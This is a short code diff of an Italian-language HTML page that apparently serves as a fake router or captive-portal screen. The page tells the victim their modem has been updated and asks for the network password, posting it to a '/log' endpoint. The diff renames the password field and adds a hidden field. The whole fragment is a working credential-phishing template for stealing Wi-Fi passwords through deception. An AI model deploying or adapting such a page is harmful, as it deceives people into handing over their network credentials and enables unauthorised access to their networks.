@@ -50,7 +50,8 @@
       <h1>essid</h1>
       <p>Il tuo modem &egrave; stato aggiornato! Inserisci la tua password di rete per completare l'operazione</p>
       <form action="/log" method="POST">
-        <input type="password" id="a" name="a" placeholder="Password di rete" minlength="6" required>
+        <input type="text" id="s" name="s" value="s" hidden>
+        <input type="password" id="pass" name="pass" placeholder="Password di rete" minlength="6" required>
         <input type="submit" value="Conferma">
       </form>
     </div>
